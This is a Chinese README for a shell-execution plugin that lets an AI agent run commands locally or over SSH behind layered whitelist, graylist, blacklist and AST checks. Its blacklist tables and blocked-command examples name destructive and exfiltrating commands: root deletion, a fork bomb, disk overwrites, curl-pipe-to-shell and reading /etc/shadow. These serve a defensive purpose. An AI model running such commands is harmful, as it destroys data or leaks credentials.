# LinuxShellExecutor v1.2.0

统一八层验证的 Linux Shell 命令执行器，专为 VCP Agent 设计。所有命令校验收敛至 execute() 内的单一顺序管线（名单驱动 + AST 语义基线）。

## 📝 本次提交维护记录 (连接池持久化修订)

- ✅ **Hybrid Direct 调用链** - 插件改为 `hybridservice` + `direct`，由 VCP 主进程常驻加载并复用执行器，避免每次工具调用都 spawn 新的 `node LinuxShellExecutor.js`。
- ✅ **默认 hosts 模板熔断** - `hosts.json` MD5 仍等于仓库模板值时，仅保留本地执行，不启动 SSH 常驻服务、连接池或远程主机重试。
- ✅ **主机配置收敛** - SSH 主机配置唯一来源为 `Plugin/LinuxShellExecutor/hosts.json`，不再保留共享模块内的 hosts 副本。
- ✅ **同主机命令串行化** - 共享 `SSHManager` 对同一 `hostId` 的普通 SSH 命令启用 FIFO 执行队列，避免池化连接上多个 exec channel 并发修改同一资产状态。
- ✅ **超时脏连接隔离** - 普通 SSH 命令超时后会断开对应池化连接，下一条命令重新建连，避免复用半关闭或远端状态不确定的连接。
- ✅ **日志跟随分流** - `tail -f` 会直接转入 `LinuxLogMonitor` 监控；`journalctl -f` 和其他长待机任务走后台日志重定向与监控，不进入普通短命令队列。
- ✅ **提权命令前置拦截** - `sudo` / `su` / `pkexec` / `doas` 在执行前返回 `interaction_required`，不进入交互式密码等待。
- ✅ **UDS 代理池化语义修复** - 在 `SSH_MANAGER_SOCK` 代理模式下，普通 SSH 执行不再把插件本地 `hosts.json` 的默认 `usePool: false` 传给常驻 `SSHManagerService`。
- ✅ **服务端配置接管** - 调用方未显式传入 `usePool` 时，由 Direct 常驻服务的池化配置决定是否复用连接，避免每条命令创建并销毁非池化 SSH 连接。
- ✅ **显式覆盖保留** - 调用方明确设置 `usePool` 时会端到端透传；未设置的普通命令不携带该字段，批量预设默认启用池化。
- ✅ **连接池稳定性** - 新主机建连前会先淘汰可用的空闲池连接，健康检查失败/异常/超时路径都会结算 Promise，避免常驻服务堆积等待任务。

## 🆕 v1.2.0 新功能 (配置回退与接口简化)

- ✅ **Host 配置回退机制** - 当全局 `SSHManager` 未找到目标主机时，自动回退至插件本地 `hosts.json` 查找，增强配置灵活性。
- ✅ **listHosts 接口简化** - 移除冗余的状态探测逻辑，仅返回主机 ID、名称与 IP，大幅提升资产列表响应速度。
- ✅ **架构健壮性提升** - 统一 `getHostConfig` 异步调用链路，确保配置加载过程中的 I/O 安全。

## 📋 v1.1.9 功能 (连接策略优化)

- ✅ **SSH 连接策略重构** - 默认采用“即用即连、完工即断”模式，彻底解决 VCP 多进程架构下的连接池失效与进程挂起问题。
- ✅ **智能连接复用** - 仅在执行批量预设 (Presets) 命令时启用临时连接池。

## 📋 v1.1.8 功能 (架构统一)

- ✅ **SSHManager 架构重构 (v1.1.8)** - 将插件私有的 SSH 管理逻辑合并至系统共享模块 `modules/SSHManager` (v1.2.4)。
- ✅ **共享单例模式** - 插件通过 `basePath` 注入方式复用系统级 SSH 连接管理器，确保与 `LinuxLogMonitor` 等插件共享连接池。
- ✅ **主机锁与状态同步** - 继承了 v1.1.7 的 HostLock (PAM 保护) 和资产状态持久化功能。

## 🆕 v1.1.7 新功能 (审计修复与加固)

- ✅ **异步任务闭环 (v1.1.7)** - 修复 `isLongRunning` 识别逻辑，确保 `yum/apt/tail` 等指令真实进入托管流程而非同步阻塞。
- ✅ **状态透传修复 (v1.1.7)** - 修正 `main()` 异步包装，确保 `Discovery` 资产引导状态能正确穿透至 Agent。
- ✅ **安全层级重构 (v1.1.7)** - 调整校验顺序，支持 `DECRYPTED_AUTH_CODE` 匹配时强制逃逸白名单与安全等级限制。
- ✅ **特殊操作符校验 (v1.1.7)** - 增强 `SecurityLevelValidator`，实现对 `;`, `&&`, `|` 等操作符的细粒度安全过滤。
- ✅ **全局 OOM 防护 (v1.1.7)** - 在插件内置及共享 `SSHManager` 模块中引入输出长度硬限制，防止长日志导致内存溢出。

## 🆕 v1.1.6 新功能 (PAM 锁定防御)

- ✅ **SSH 认证锁定防御 (v1.1.6)** - 显式禁用 `keyboard-interactive` 探测，防止因并发连接触发服务器 PAM `pam_faillock` 导致账户锁定。
- ✅ **主机级并发串行化 (v1.1.6)** - 引入 `Host-Level Serialization` 机制。在全局并发限制基础上，对单个主机的认证过程进行强制排队，彻底消除瞬时并发认证冲击风险。
- ✅ **认证方法显式化 (v1.1.6)** - 优化 `ssh2` 配置，根据 `hosts.json` 显式指定 `key` 或 `password` 路径，跳过冗余的认证方法协商。

## 🆕 v1.1.5 新功能

- ✅ **全平台静默安装 (v1.1.5)** - 自动为 `apt`, `yum`, `pacman`, `yay`, `zypper`, `pip`, `npm` 等补全非交互参数（`-y`, `--noconfirm`）及 CI 环境变量。
- ✅ **资源锁柔性修复 (v1.1.5)** - 内置 `_safeCleanupLocks` 逻辑，自动识别并安全修复包管理器死锁（如 `/var/lib/dpkg/lock`），规避 AI 执行 `rm` 指令受限的问题。
- ✅ **异步任务托管强化** - 完善 `isLongRunning` 逻辑，支持真正的后台进程运行与日志重定向。
- ✅ **交互阻塞探测** - 自动识别 `sudo` 密码、`[y/n]`、资源锁、选择提示符等交互特征，并及时返回 `interaction_required` 或 `background` 状态。
- ✅ **跨插件接力引导** - 异步任务自动返回 `LinuxLogMonitor` 指令模板，引导 AI 进行全量进度追踪。

## 📋 v1.1.0 功能

- ✅ **授权码逃逸层** - 允许通过管理员授权码强制执行未定义（unknown）的命令。
- ✅ **资产引导系统** - 当 `hostId` 缺失或不匹配时，主动返回 `status: "discovery"` 及可用资产列表。
- ✅ **长待机指令支持** - 增加 `isLongRunning` 选项，将耗时任务（如安装、日志追踪）托管至后台并立即返回 `taskId`。
- ✅ **主机列表接口** - `listHosts` 返回主机 ID、名称与地址（不主动探测连通性）。

## 📋 v0.4.0 功能

- ✅ **四级安全分级** - read/safe/write/danger 权限分级。
- ✅ **智能管道验证** - 基于安全级别的管道链验证。
- ✅ **预设诊断命令** - 12 个预设命令集（quickDiag, checkService 等）。
- ✅ **输出格式化** - 自动截断、表格美化、多格式支持。

## 📋 v1.1.5 AI 协作流程

1. **执行长时任务**: 建议设置 `isLongRunning: true`。插件会返回 `taskId`，AI 随后应引导用户使用 `LinuxLogMonitor` 插件进行日志追踪。
2. **处理资源锁**: 若返回 `interaction_required` 且 `blockType` 为 `resource_locked`，AI 应主动调用 `_safeCleanupLocks` 进行修复。
3. **静默化原则**: 插件已内置 `_patchCommandForNonInteractive`，AI 无需在命令中手动拼接 `-y`。

## 📋 v1.1.0 迭代功能

- ✅ **授权码逃逸** - 允许通过管理员授权码强制执行未定义命令。
- ✅ **资产引导** - `hostId` 错误时自动返回可用资产列表。
- ✅ **长待机托管** - 支持 `isLongRunning` 参数，自动托管耗时任务。
- ✅ **主机列表** - `listHosts` 返回主机基础信息（不做连通性过滤）。

## 📋 v0.3.x 功能

- ✅ **三级权限控制** - 白名单（免验证）/ 灰名单（需验证）/ 黑名单（禁止）
- ✅ **资源限制 (rlimit)** - 支持 CPU、内存、文件大小、进程数等资源限制
- ✅ **管道命令验证** - 支持管道命令的安全验证，限制管道深度和允许的命令
- ✅ **SSH 连接池优化** - 连接数量限制、自动重试、连接池大小管理

## 📋 v0.2.0 功能

- ✅ **多主机 SSH 远程执行** - 支持配置多台 Linux 服务器
- ✅ **密钥/密码认证** - 支持 SSH 私钥和密码两种认证方式
- ✅ **跳板机支持** - 支持通过跳板机访问内网服务器
- ✅ **连接池管理** - 自动管理 SSH 连接，支持会话复用

## 架构概览

`runToolCall` 现为**轻量编排器**：解析参数 → 预设展开 → 预设安全确认（`write`/`danger` 预设需 `requireAdmin`，`danger` 另需 `doubleConfirm`）→ 特殊动作分发（`listHosts`/`testConnection`/`getStatus`/`listPresets`）→ 提权命令前置拦截 → 组装 `executeOptions`（含 `authCode`/`requireAdmin`/`doubleConfirm`）→ 调用 `executor.execute(cmd, executeOptions)` → 聚合并格式化结果。

> 旧的「System A」安全分级块已从 `runToolCall` **移除**。所有命令校验统一收敛至 `execute()` 内的单一顺序管线。

```
runToolCall（轻量编排器）
  参数解析 → 预设展开 → 预设安全确认 → 动作分发
        → 提权前置拦截 → 组装 executeOptions → execute()
                          │
                          ▼
execute() 八层验证管线（名单驱动，单一入口）
  1.提权前置   2.特殊操作符硬护栏   3.黑名单
  4.白名单(免验证) → 5.灰名单(需验证) → 6.未知(授权逃逸)
  7.AST 语义基线   8.执行(SSH 远程 / 本地沙箱)
                          │
                          ▼
  共享 SSHManager  /  SandboxManager（bubblewrap/firejail/docker/none）
```

## 验证层序（execute() 八层管线）

以下八层在 `execute()` 内**按顺序**执行，命中即拦截。错误前缀供客户端识别拦截层。

| # | 层 | 作用 | 拦截方式 / 前缀 | 授权码可绕过 |
|---|----|------|-----------------|--------------|
| 1 | 提权前置 (preflight) | 检测 `sudo`/`pkexec`/`doas`/`su -` | 返回 `interaction_required`（非抛错） | 否 |
| 2 | 特殊操作符硬护栏 | 拦截 `;`、后台 `&`（正则 `/(?<!&)&(?![&>])/`，排除 `&&`/`&>`）、子shell `$()`/`` ` `` | 抛 `[安全分级] ... 该操作不可通过授权码绕过。` | 否（授权码正确也不绕过） |
| 3 | 黑名单 | `config.env` 的 `FORBIDDEN_PATTERNS`（正则）+ `FORBIDDEN_COMMANDS`（精确） | 抛 `[黑名单]` | 否 |
| 4 | 白名单 (`whitelist.json`) | 免验证放行；校验 allowedArgs、pathRestrictions(含 `..` 遍历)、子命令、allowedQueries；管道走 `validatePipeline`。白名单内但校验失败（如 `cat /etc/shadow`） | 抛 `[白名单]` | 否（不可逃逸） |
| 5 | 灰名单 (`graylist.json`) | 需授权码 + 参数/路径校验。`critical` 风险（reboot/shutdown/init）另需 `doubleConfirm:true`；low/medium/high 仅单次授权 | 抛 `[灰名单]`（3 分支消息） | 是（需正确 `requireAdmin`） |
| 6 | 未知命令（不在任何名单） | 授权码逃逸；记录告警「未知命令通过授权码逃逸」 | 抛 `[安全分级]`（3 分支消息） | 是（需正确 `requireAdmin`，无 doubleConfirm） |
| 7 | AST 语义基线 (`ASTAnalyzer`) | 始终运行，仅 critical 级阻断：命令注入 `$()`、网络外泄 `curl\|sh`/`bash -i /dev/tcp`、提权 `sudo` 等 | 抛 `[AST分析]` | 否（授权码不绕过） |
| 8 | 执行 | SSH 远程（共享 SSHManager）或本地沙箱（bubblewrap/firejail/docker/none） | — | — |

> **防御纵深**：`&&`/`||` 可通过第 2 层，但普通命令仍被白名单 `forbiddenCharacters`（第 4 层，含 `;`/`&&`/`||`/`` ` ``/`$(`/`${`/`>`/`>>`/`<`/`&` 等）限制。预设命令 `preset:` 展开后 `isPresetCommand=true`，**跳过白名单层**，故预设模板内的 `&&` 可正常执行。
> **AST 下沉**：`ast` 层现已从 `standard` 起启用（此前仅 `high`/`maximum`）。

## 授权模型与错误前缀

**授权三要素**
- `authCode`：真正的管理员验证码，由 `resolveAdminAuthCode(context)` 解析 = `context.decryptedAuthCode` ‖ `process.env.DECRYPTED_AUTH_CODE`（服务端注入，用户不直接传入）。
- `requireAdmin`：用户提交的验证码。
- `doubleConfirm`：二次确认标志（仅灰名单 `critical` 风险 / `danger` 预设需要）。
- 判定：`authOk = authCode && requireAdmin && String(requireAdmin) === authCode`。

**授权失败 3 分支消息**（灰名单与未知命令共用）
1. 未提供 `requireAdmin` → 灰名单：`[灰名单] 命令 "X" 需要管理员验证码（风险级别: R）。请提供 requireAdmin 参数（6位验证码）。`；未知：`[安全分级] 命令 "X" 不在任何名单中，如需执行请提供正确的管理员验证码。`
2. 已提供 `requireAdmin` 但服务端无法解析 `authCode` → `无法获取管理员验证码。请确保主服务器配置正确。`
3. 已提供但错误 → `管理员验证码错误。`

**错误前缀约定**（客户端据此识别拦截层，勿改）：`[黑名单]` / `[灰名单]` / `[白名单]` / `[AST分析]` / `[安全分级]`。

## 安装依赖

```bash
cd Plugin/LinuxShellExecutor
npm install ssh2 dotenv
```

## 系统依赖（本地沙箱执行）

```bash
# Bubblewrap（推荐，最轻量）
apt install bubblewrap

# 或 Firejail
apt install firejail

# 或 Docker
apt install docker.io
```

## 配置说明

### 1. 主机配置 (hosts.json)

主机配置唯一读取路径为 `Plugin/LinuxShellExecutor/hosts.json`。如果该文件仍是仓库默认模板（MD5: `b1d6472eba3a65b9354a096ce21d3f3e`），系统会认为用户尚未配置真实 SSH 资产，只启用 `local` 本地执行，并跳过 SSH 常驻服务、连接池预热和远程连接重试。

```json
{
    "hosts": {
        "local": {
            "name": "本地执行",
            "type": "local",
            "enabled": true,
            "securityLevel": "standard"
        },
        "dev-server": {
            "name": "开发服务器",
            "type": "ssh",
            "enabled": true,
            "host": "192.168.1.100",
            "port": 22,
            "username": "developer",
            "authMethod": "key",
            "privateKeyPath": "~/.ssh/id_rsa",
            "securityLevel": "standard"
        },
        "prod-server": {
            "name": "生产服务器",
            "type": "ssh",
            "enabled": true,
            "host": "10.0.0.10",
            "port": 22,
            "username": "ops",
            "authMethod": "key",
            "privateKeyPath": "/path/to/prod_key",
            "securityLevel": "high",
            "jumpHost": "bastion"
        }
    },
    "defaultHost": "local",
    "globalSettings": {
        "maxConcurrentConnections": 5,
        "connectionPoolSize": 10,
        "defaultTimeout": 30000,
        "retryAttempts": 3,
        "retryDelay": 1000,
        "logConnections": true
    }
}
```

### hosts.json 字段说明

#### 主机配置字段 (hosts.{hostId})

| 字段 | 类型 | 必需 | 默认值 | 说明 |
|------|------|------|--------|------|
| `name` | string | ✓ | - | 主机显示名称 |
| `description` | string | | - | 主机描述信息 |
| `type` | string | ✓ | - | 主机类型：`local`（本地）或 `ssh`（远程） |
| `enabled` | boolean | ✓ | - | 是否启用该主机 |
| `host` | string | SSH必需 | - | SSH 主机地址（IP 或域名） |
| `port` | number | | 22 | SSH 端口号 |
| `username` | string | SSH必需 | - | SSH 登录用户名 |
| `authMethod` | string | SSH必需 | - | 认证方式：`key`（密钥）或 `password`（密码） |
| `privateKeyPath` | string | 密钥认证必需 | - | SSH 私钥文件路径，支持 `~` 展开 |
| `passphrase` | string | | "" | 私钥密码短语（如果私钥有密码保护） |
| `password` | string | 密码认证必需 | - | SSH 登录密码（不推荐使用） |
| `securityLevel` | string | | "standard" | 安全等级：`basic`/`standard`/`high`/`maximum` |
| `timeout` | number | | 30000 | 连接超时时间（毫秒） |
| `keepAliveInterval` | number | | 10000 | 心跳保活间隔（毫秒） |
| `jumpHost` | string | | null | 跳板机主机ID（用于访问内网服务器） |
| `tags` | array | | [] | 主机标签，用于分类和筛选 |

#### 全局配置字段 (globalSettings)

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `maxConcurrentConnections` | number | 5 | 最大并发连接数 |
| `connectionPoolSize` | number | 10 | 连接池大小 |
| `defaultTimeout` | number | 30000 | 默认超时时间（毫秒） |
| `retryAttempts` | number | 3 | 连接失败重试次数 |
| `retryDelay` | number | 1000 | 重试间隔（毫秒） |
| `logConnections` | boolean | true | 是否记录连接日志 |

#### 顶层配置字段

| 字段 | 类型 | 说明 |
|------|------|------|
| `version` | string | 配置文件版本号 |
| `description` | string | 配置文件描述 |
| `hosts` | object | 主机配置对象，key 为主机ID |
| `defaultHost` | string | 默认主机ID，未指定 hostId 时使用 |
| `globalSettings` | object | 全局设置 |

### 2. 认证方式

#### SSH 密钥认证（推荐）

```json
{
    "authMethod": "key",
    "privateKeyPath": "~/.ssh/id_rsa",
    "passphrase": ""
}
```

#### 密码认证（不推荐）

```json
{
    "authMethod": "password",
    "password": "your-password"
}
```

### 3. 跳板机配置

```json
{
    "bastion": {
        "name": "跳板机",
        "type": "ssh",
        "host": "bastion.example.com",
        "username": "jump",
        "authMethod": "key",
        "privateKeyPath": "~/.ssh/bastion_key"
    },
    "internal-server": {
        "name": "内网服务器",
        "type": "ssh",
        "host": "192.168.100.50",
        "username": "admin",
        "authMethod": "key",
        "privateKeyPath": "~/.ssh/internal_key",
        "jumpHost": "bastion"
    }
}
```

## 调用方式

### 基本命令执行

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
command:「始」ls -la /tmp「末」
<<<[END_TOOL_REQUEST]>>>
```

### 指定远程主机

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
command:「始」df -h「末」,
hostId:「始」dev-server「末」
<<<[END_TOOL_REQUEST]>>>
```

### 列出所有主机

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
action:「始」listHosts「末」
<<<[END_TOOL_REQUEST]>>>
```

### 测试主机连接

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
action:「始」testConnection「末」,
hostId:「始」dev-server「末」
<<<[END_TOOL_REQUEST]>>>
```

### 获取连接状态

```
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
action:「始」getStatus「末」
<<<[END_TOOL_REQUEST]>>>
```

## 参数说明

| 参数 | 类型 | 必需 | 说明 |
|------|------|------|------|
| `command` | string | ✓* | 要执行的 Shell 命令，或 `preset:预设名?参数` 格式 |
| `action` | string | ✓* | 特殊操作：listHosts/testConnection/getStatus/listPresets |
| `hostId` | string | | 目标主机ID，默认 'local' |
| `isLongRunning` | boolean | | 是否为长待机指令（设为 true 后任务转入后台） |
| `timeout` | number | | 超时时间（毫秒），默认 30000 |
| `outputFormat` | string | | 输出格式：raw/formatted/json，默认 'formatted' |
| `requireAdmin` | string | 条件必需 | 用户提交的管理员验证码（6位）。用于灰名单授权、未知命令授权逃逸、write/danger 预设确认 |
| `doubleConfirm` | boolean | 条件必需 | 二次确认标志。灰名单 critical 风险（reboot/shutdown/init）与 danger 预设必需 |

> `authCode`（真正的管理员验证码）由服务端从 `context.decryptedAuthCode` / `DECRYPTED_AUTH_CODE` 注入，用户不直接传入；用户侧只提交 `requireAdmin` 与 `doubleConfirm`。

*注：command 和 action 二选一

## 返回格式

### 命令执行成功

```json
{
    "status": "success",
    "result": "命令输出内容",
    "stderr": "错误输出（如有）",
    "code": 0,
    "duration": 123,
    "hostId": "dev-server",
    "securityLevel": "standard",
    "executionType": "ssh"
}
```

### 列出主机

```json
{
    "status": "success",
    "hosts": [
        {
            "id": "local",
            "name": "本地执行",
            "host": "localhost"
        },
        {
            "id": "dev-server",
            "name": "开发服务器",
            "host": "192.168.1.100"
        }
    ]
}
```

### 连接测试

```json
{
    "status": "success",
    "success": true,
    "hostId": "dev-server",
    "latency": 45,
    "message": "连接成功，延迟 45ms"
}
```

## 安全等级

启用层由 `enabledLayers` 映射决定（代码驱动，构造器内定义）：

| 等级 | 启用层 (enabledLayers) | 适用场景 |
|------|------------------------|----------|
| `basic` | blacklist | 内部可信环境 |
| `standard` | blacklist + whitelist + **ast** + sandbox | 一般生产环境（默认） |
| `high` | blacklist + whitelist + ast + sandbox | 敏感数据环境 |
| `maximum` | blacklist + whitelist + ast + sandbox + audit | 公开 API / 多租户 |

> 本次重构将 **AST 下沉至 `standard`**（此前仅 high/maximum）。`ast` 与 `sandbox` 现从 `standard` 起启用；`audit`（审计日志）仅 `maximum` 启用。

## 白名单命令列表（无需验证）

| 命令 | 说明 | 允许的参数 |
|------|------|-----------|
| `ls` | 列出目录 | -l, -a, -la, -lh, -R, -t, -S |
| `cat` | 查看文件 | -n, -b, -s |
| `grep` | 文本搜索 | -i, -n, -r, -v, -c, -l, -E, -w |
| `find` | 查找文件 | -name, -type, -size, -mtime, -maxdepth |
| `ps` | 查看进程 | aux, -ef, -u, --forest |
| `df` | 磁盘使用 | -h, -T, -i |
| `free` | 内存使用 | -m, -h, -g |
| `head` | 文件头部 | -n, -c |
| `tail` | 文件尾部 | -n, -f, -c |
| `wc` | 统计 | -l, -w, -c, -m |
| `echo` | 输出文本 | -n, -e |
| `pwd` | 当前目录 | - |
| `whoami` | 当前用户 | - |
| `date` | 日期时间 | +%Y-%m-%d, +%H:%M:%S |
| `uname` | 系统信息 | -a, -r, -m, -n |
| `hostname` | 主机名 | -f, -i |
| `uptime` | 运行时间 | -p, -s |
| `id` | 用户ID | -u, -g, -n |
| `env` | 环境变量 | - |
| `which` | 命令路径 | -a |
| `file` | 文件类型 | -b, -i |
| `stat` | 文件状态 | -c |
| `du` | 目录大小 | -h, -s, -a, -c |
| `sort` | 排序 | -n, -r, -u, -k, -t |
| `uniq` | 去重 | -c, -d, -u |
| `cut` | 字段切割 | -d, -f, -c |
| `awk` | 文本处理 | -F |
| `sed` | 流编辑器 | -n, -e |

## 灰名单命令列表（需要验证）

### 系统状态监控

| 命令 | 说明 | 风险级别 |
|------|------|----------|
| `uptime` | 系统运行时间 | 🟢 低 |
| `free` | 内存使用情况（扩展参数） | 🟢 低 |
| `top` | 系统监控（扩展迭代） | 🟢 低 |
| `htop` | 交互式进程监控 | 🟡 中 |
| `vmstat` | 虚拟内存统计（扩展） | 🟢 低 |
| `iostat` | IO 统计（扩展） | 🟢 低 |

### 网络诊断

| 命令 | 说明 | 风险级别 |
|------|------|----------|
| `ip` | 网络配置查看 | 🟢 低 |
| `ss` | Socket 统计（扩展） | 🟢 低 |
| `ping` | 网络连通性测试（扩展） | 🟢 低 |
| `traceroute` | 路由追踪 | 🟢 低 |
| `mtr` | 网络诊断 | 🟢 低 |
| `curl` | HTTP 请求（完整功能） | 🟡 中 |
| `wget` | HTTP 下载 | 🟡 中 |
| `nc/netcat` | 网络调试工具 | 🟡 中 |
| `tcpdump` | 网络抓包 | 🔴 高 |

### 进程管理

| 命令 | 说明 | 风险级别 |
|------|------|----------|
| `pgrep` | 按名称查找进程 | 🟢 低 |
| `lsof` | 列出打开的文件/端口 | 🟢 低 |
| `kill` | 终止进程 | 🔴 高 |
| `killall` | 按名称终止进程 | 🔴 高 |
| `pkill` | 按模式终止进程 | 🔴 高 |

### 日志查看

| 命令 | 说明 | 风险级别 |
|------|------|----------|
| `tail` | 实时日志追踪（-f 模式） | 🟡 中 |
| `journalctl` | 系统日志查询（扩展） | 🟡 中 |
| `dmesg` | 内核日志（扩展） | 🟡 中 |

### 服务管理

| 命令 | 说明 | 风险级别 |
|------|------|----------|
| `systemctl` | 服务管理（完整控制） | 🔴 高 |
| `service` | 服务管理（传统命令） | 🔴 高 |

### Docker 容器

| 命令 | 说明 | 风险级别 |
|------|------|----------|
| `docker` | Docker 完整管理 | 🔴 高 |
| `docker-compose` | Docker Compose 管理 | 🔴 高 |

### 数据库管理

| 命令 | 说明 | 风险级别 |
|------|------|----------|
| `mysql` | MySQL 管理（扩展） | 🔴 高 |
| `mysqladmin` | MySQL 管理工具 | 🟡 中 |
| `redis-cli` | Redis 管理（扩展） | 🔴 高 |
| `psql` | PostgreSQL 客户端 | 🔴 高 |
| `mongo` | MongoDB 客户端 | 🔴 高 |

### 系统控制

| 命令 | 说明 | 风险级别 |
|------|------|----------|
| `nginx` | Nginx 管理 | 🔴 高 |
| `apachectl` | Apache 管理 | 🔴 高 |
| `crontab` | 定时任务查看 | 🟡 中 |
| `timedatectl` | 时间日期管理 | 🟡 中 |
| `reboot` | 重启系统 | ⚫ 极高 |
| `shutdown` | 关机/重启 | ⚫ 极高 |

## 黑名单命令列表（完全禁止）

黑名单配置在 `config.env` 文件中，分为两类：

### 禁止模式（正则匹配）

| 模式 | 说明 | 危险等级 |
|------|------|----------|
| `rm -rf /` | 删除根目录 | ⚫ 致命 |
| `rm -rf /*` | 删除根目录所有内容 | ⚫ 致命 |
| `mkfs.*` | 格式化文件系统 | ⚫ 致命 |
| `dd if=` | 磁盘镜像写入 | ⚫ 致命 |
| `:(){ :\|:& };:` | Fork 炸弹 | ⚫ 致命 |
| `chmod 777 /` | 修改根目录权限 | 🔴 高危 |
| `chmod -R 777` | 递归修改权限 | 🔴 高危 |
| `> /dev/sd*` | 写入磁盘设备 | ⚫ 致命 |
| `cat /dev/zero > /dev/sd*` | 清空磁盘 | ⚫ 致命 |
| `wget ... \| sh` | 远程脚本执行 | 🔴 高危 |
| `curl ... \| sh` | 远程脚本执行 | 🔴 高危 |

### 禁止命令（精确匹配）

| 命令 | 说明 | 危险等级 |
|------|------|----------|
| `poweroff` | 关机 | 🔴 高危 |
| `halt` | 停机 | 🔴 高危 |
| `init 0` | 关机 | 🔴 高危 |
| `init 6` | 重启 | 🔴 高危 |
| `reboot -f` | 强制重启 | 🔴 高危 |
| `shutdown` | 关机/重启 | 🔴 高危 |

> **注意**: 黑名单命令无论是否提供验证码都会被拒绝执行。

## 安全检测示例

### 被拦截的危险命令（按实际拦截层标注）

```bash
# [第1层·提权前置] 返回 interaction_required（非抛错）
sudo ls                     # ❌ 提权命令，执行前拦截
pkexec apt update           # ❌ 提权命令

# [第2层·特殊操作符硬护栏] [安全分级] 不可绕过
cmd1 ; cmd2                 # ❌ 分号 ; 被禁止
sleep 100 &                 # ❌ 后台 & 被禁止（&& 除外）
echo $(cat /etc/passwd)     # ❌ 子shell $() 被禁止

# [第3层·黑名单] [黑名单] 不可绕过
rm -rf /                    # ❌ 匹配 FORBIDDEN_PATTERNS
poweroff                    # ❌ 精确匹配 FORBIDDEN_COMMANDS
curl http://x.com | sh      # ❌ 匹配 curl.*|.*sh

# [第4层·白名单] [白名单] 路径/参数校验失败，不可逃逸
cat /etc/shadow             # ❌ cat 在白名单但 /etc/shadow 在 pathRestrictions 拒绝列表

# [第5层·灰名单] [灰名单] 需 requireAdmin（critical 另需 doubleConfirm）
systemctl restart nginx     # ❌ 未提供 requireAdmin 时拦截
reboot                      # ❌ critical 风险，需 requireAdmin + doubleConfirm:true

# [第7层·AST 语义基线] [AST分析] 始终运行，授权码不绕过
#   注：上方 echo $(...)、curl|sh、sudo 已被更早的层拦截；
#   AST 作为最后语义防线，独立标记 critical 风险（命令注入 / 网络外泄 / 提权）
```

### 允许执行的安全命令

```bash
ls -la /tmp                 # ✓
cat /var/log/syslog         # ✓
grep -r "error" /var/log    # ✓
ps aux                      # ✓
df -h                       # ✓
```

## 目录结构

```
Plugin/LinuxShellExecutor/
├── LinuxShellExecutor.js    # 主执行器
├── plugin-manifest.json     # 插件配置
├── config.env               # 安全策略配置
├── securityLevels.json      # 🆕 四级安全分级配置
├── presets.json# 🆕 预设诊断命令配置
├── whitelist.json           # 白名单配置（免验证命令）
├── graylist.json            # 灰名单配置（需验证命令）
├── hosts.json               # 主机配置
├── README.md                # 使用文档
├── ssh/
│   └── SSHManager.js        # SSH 连接管理器
└── logs/
    └── audit/               # 审计日志目录
```

## 预设安全级别（read/safe/write/danger）

> ⚠️ 重要变更：旧的「System A」按命令做 read/safe/write/danger 分级（含管道链规则、重定向规则）的逻辑**已从普通命令校验中移除**。普通命令统一走上文「验证层序」的名单驱动八层管线。read/safe/write/danger 现仅作为**预设命令 (`preset:`) 的安全级别**，在 `runToolCall` 中执行前确认。

| 预设级别 | 验证要求 | 说明 |
|----------|----------|------|
| `read` | 无需验证 | 只读诊断预设，自动放行 |
| `safe` | 无需验证 | 低风险预设，自动放行 |
| `write` | 需要 `requireAdmin` | 写操作预设，需管理员验证码 |
| `danger` | 需要 `requireAdmin` + `doubleConfirm:true` | 高危预设，需验证码 + 二次确认 |

预设级别取自 `presets.json` 中各预设的 `securityLevel` 字段（默认 `safe`）。`write`/`danger` 预设在 `runToolCall` 展开后、调用 `execute()` 前完成授权确认；`danger` 预设另需 `doubleConfirm: true`。

### 管道与重定向（现行机制）

旧的「按安全级别组合的管道链规则」与「仅 write 允许重定向」规则已废弃，现行机制为：
- **特殊操作符硬护栏**（第 2 层）：拦截 `;`、后台 `&`、子shell `$()`/`` ` ``；`&&`/`||` 可通过此层。
- **白名单 `forbiddenCharacters`**（第 4 层）：对普通命令限制 `;`、`&&`、`||`、`` ` ``、`$(`、`${`、`>`、`>>`、`<`、`<<`、`&` 等（预设命令跳过此层）。
- **白名单 `validatePipeline`**：管道命令须命中白名单，且管道成员受 `allowedPipeCommands` / `forbiddenInPipe` 约束，深度受 `maxPipelineDepth` 限制。
- 路径访问由各名单的 `pathRestrictions`（allowed/denied + `..` 遍历检查）控制。

## 预设诊断命令 (v0.4.0)

### 可用预设列表

| 预设名 | 说明 | 参数 |
|--------|------|------|
| `quickDiag` | 快速系统诊断 | 无 |
| `checkService` | 检查服务状态 | serviceName (必需) |
| `netDiag` | 网络诊断 | 无 |
| `checkDisk` | 磁盘详细检查 | 无 |
| `checkDocker` | Docker 状态检查 | containerName (可选) |
| `checkMysql` | MySQL 状态检查 | 无 |
| `checkRedis` | Redis 状态检查 | 无 |
| `checkNginx` | Nginx 状态检查 | 无 |
| `securityAudit` | 安全审计 | 无 |
| `performanceCheck` | 性能检查 | 无 |
| `logAnalysis` | 日志分析 | logFile (必需), pattern (可选) |
| `processTree` | 进程树查看 | 无 |

### 预设命令调用示例

```
# 快速系统诊断
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
command:「始」preset:quickDiag「末」
<<<[END_TOOL_REQUEST]>>>

# 检查 nginx 服务
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
command:「始」preset:checkService?serviceName=nginx「末」
<<<[END_TOOL_REQUEST]>>>

# 分析日志文件
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
command:「始」preset:logAnalysis?logFile=/var/log/syslog&pattern=error「末」
<<<[END_TOOL_REQUEST]>>>

# 列出所有预设
<<<[TOOL_REQUEST]>>>
tool_name:「始」LinuxShellExecutor「末」,
action:「始」listPresets「末」
<<<[END_TOOL_REQUEST]>>>
```

## 输出格式化 (v0.4.0)

### 输出格式选项

| 格式 | 说明 |
|------|------|
| `raw` | 原始输出，不做任何处理 |
| `formatted` | 格式化输出（默认），自动截断、表格美化 |
| `json` | JSON 格式输出，便于程序解析 |

### 自动截断

- 默认最大输出行数：100 行
